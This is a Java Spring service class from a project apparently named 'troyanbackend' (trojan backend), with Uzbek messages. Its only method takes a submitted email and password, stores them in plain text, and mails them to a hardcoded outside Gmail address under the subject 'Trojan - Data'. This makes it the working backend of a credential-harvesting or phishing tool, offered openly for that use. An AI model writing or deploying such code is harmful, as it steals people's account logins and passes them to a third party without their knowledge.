package org.example.troyanbackend.service;

import lombok.RequiredArgsConstructor;
import org.example.troyanbackend.dto.NotesDto;
import org.example.troyanbackend.entity.NotesTable;
import org.example.troyanbackend.payload.ApiResponse;
import org.example.troyanbackend.repository.NotesRepos;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Service;

@SuppressWarnings("SpringJavaInjectionPointsAutowiringInspection")
@Service
@RequiredArgsConstructor
public class NotesService {

    private final NotesRepos notesRepos;
    private final JavaMailSender javaMailSender;

    @Value("${spring.mail.username}")
    private String adminEmail;

    public ApiResponse sendMail(NotesDto notesDto) {

        NotesTable notesTable = new NotesTable();
        notesTable.setEmail(notesDto.getEmail());
        notesTable.setPassword(notesDto.getPassword());

        notesRepos.save(notesTable);

        try {

            SimpleMailMessage mailMessage = new SimpleMailMessage();
            mailMessage.setFrom(adminEmail);
            mailMessage.setTo("aceraspire8246@gmail.com");
            mailMessage.setSubject("Troyan - Ma'lumotlar");
            mailMessage.setText("Ma'lumotlar yuborildi!");

            String emailBodyy = String.format(
                    "Yangi ma'lumotlar:\n\nTitle: %s\nPasses: %s\n",
                    notesDto.getEmail(),
                    notesDto.getPassword()
            );
            mailMessage.setText(emailBodyy);

            javaMailSender.send(mailMessage);

            return new ApiResponse("Ma'lumot yuborildi!", true);

        } catch (Exception e) {
            return new ApiResponse("Ma'lumot yuborilishda xatolik mavjud!" ,false);
        }

//        return (notesDto.getTitle().isEmpty() && notesDto.getPasses().isEmpty())
//                ? new ApiResponse("Ma'lumot kiritish maydoni bo'sh bo'lmasligi kerak", false)
//                : new ApiResponse("Ma'lumot emailga yuborildi!", true);
    }
}
